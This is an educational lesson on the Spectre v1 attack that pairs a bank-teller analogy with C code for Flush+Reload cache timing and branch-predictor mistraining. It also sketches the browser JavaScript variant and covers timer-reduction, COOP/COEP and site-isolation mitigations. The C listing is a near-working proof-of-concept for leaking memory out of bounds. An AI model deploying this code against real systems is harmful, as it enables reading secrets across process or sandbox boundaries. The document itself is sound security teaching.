Flush+Reload & Branch Predictor

No bug in the JS engine needed. Spectre uses the CPU's branch predictor and cache timing to read memory that the bounds check already refused. The CPU does the out-of-bounds access speculatively — then the cache betrays it.

01 — The Big Analogy

Head First Moment

Imagine a bank teller who is very eager to help. While you're showing ID (bounds check), the teller starts pre-counting your cash (speculative execution). If your ID is rejected, the teller puts the cash back — but they've already touched those specific bills. A very observant attacker can tell which bills were handled (cache state) just by watching how quickly the teller reaches for them next time (timing). That's Spectre: the speculative work was rolled back logically, but the side effects in the cache remain.

02 — The Flush+Reload Technique

/* flush_reload.c — the cache timing primitive */
#include <x86intrin.h>

#define CACHE_LINE_SIZE 64
#define PROBE_ARRAY_SIZE (256 * CACHE_LINE_SIZE)

uint8_t probe_array[PROBE_ARRAY_SIZE];

/* Step 1: FLUSH — evict probe_array from all cache levels */
void flush_probe_array(void) {
    for (int i = 0; i < 256; i++)
        _mm_clflush(&probe_array[i * CACHE_LINE_SIZE]);
    _mm_mfence();  /* memory fence: ensure flushes complete */
}

/* Step 2: VICTIM reads secret byte, uses it as index into probe */
void victim_access(uint8_t *array, size_t idx, size_t array_len) {
    if (idx < array_len) {           /* bounds check */
        uint8_t val = array[idx];    /* bounds check passes normally */
        /* CPU also speculatively executes WITH idx >= array_len
           before the branch resolves! */
        probe_array[val * CACHE_LINE_SIZE] += 1;  /* loads cache line */
    }
}

/* Step 3: RELOAD — time access to each probe_array[i] */
int reload_and_detect(void) {
    int leaked_byte = -1;
    uint64_t min_time = UINT64_MAX;
    for (int i = 0; i < 256; i++) {
        uint64_t t0 = __rdtscp(NULL);
        volatile uint8_t v = probe_array[i * CACHE_LINE_SIZE];
        uint64_t t1 = __rdtscp(NULL);
        uint64_t delta = t1 - t0;
        if (delta < min_time) {
            min_time    = delta;
            leaked_byte = i;
        }
    }
    return leaked_byte;  /* the byte that was speculatively accessed */
}

03 — Training the Branch Predictor

/* The key insight: the CPU's branch predictor is trained by
   history. If we call victim_access with VALID indices many times,
   the predictor learns "this branch is usually TAKEN."
   Then on the malicious call with out-of-bounds idx, the predictor
   speculatively executes the body BEFORE checking the bounds. */

void spectre_attack(uint8_t *victim_array, size_t victim_len,
                    uint8_t *secret, size_t secret_idx) {
    /* Step 1: train predictor with valid accesses */
    for (int train = 0; train < 30; train++) {
        size_t valid_idx = train % victim_len;
        victim_access(victim_array, valid_idx, victim_len);
    }

    /* Step 2: flush the probe array */
    flush_probe_array();

    /* Step 3: ALSO flush victim_len from cache
       (so the bounds check must wait for a cache miss = more
       speculation window for the CPU) */
    _mm_clflush(&victim_len);
    _mm_mfence();

    /* Step 4: out-of-bounds access — secret_idx points OUTSIDE
       victim_array, into secret memory */
    victim_access(victim_array, secret_idx, victim_len);

    /* Step 5: reload and measure */
    int leaked = reload_and_detect();
    printf("Leaked byte: 0x%02x ('%c')\n", leaked,
           isprint(leaked) ? leaked : '?');
}

JavaScript Spectre

In a browser, the attacker writes JavaScript that performs the flush (via SharedArrayBuffer typed array clears), trains the predictor with valid array accesses, then triggers the speculative OOB read. The timing oracle comes from performance.now() or a SharedArrayBuffer counter. After the Spectre disclosure in Jan 2018, browsers reduced performance.now() resolution and disabled SharedArrayBuffer — both are timer reduction mitigations.

05 — Brain Exercise

Sharpen Your Pencil

After the Spectre disclosure, browsers lowered performance.now() resolution from 5 microseconds to 100 microseconds. Our flush+reload distinguishes cache hit (~4ns) from miss (~100ns). At 100µs timer resolution, both look the same.

How do attackers get around timer reduction? One approach: a counting thread increments a SharedArrayBuffer integer as fast as possible in a Web Worker — the attacker reads that counter as a clock. If SharedArrayBuffer is re-enabled (it was, with COOP/COEP headers), does this attack work again? What do COOP and COEP actually provide?

There Are No Dumb Questions

Q: Why can't the CPU just not do speculative execution?
Speculative execution is responsible for 30–40% of modern CPU performance. Out-of-order execution, branch prediction, and speculative loads all interact to fill pipeline bubbles. Disabling speculation would make CPUs dramatically slower. The mitigations (retpoline, IBRS, microcode updates) reduce the attack window while preserving most of the performance benefit.
Q: How does site isolation (B04) help with Spectre?
Spectre can only leak memory within the current process's address space. With site isolation, each renderer process only contains data from one site. An attacker running JS on evil.com can Spectre-read their own renderer's memory — but bank.com's data is in a different process with a different address space. The MMU boundary (separate CR3 per process, as you built in Module 15!) stops cross-site Spectre leaks.
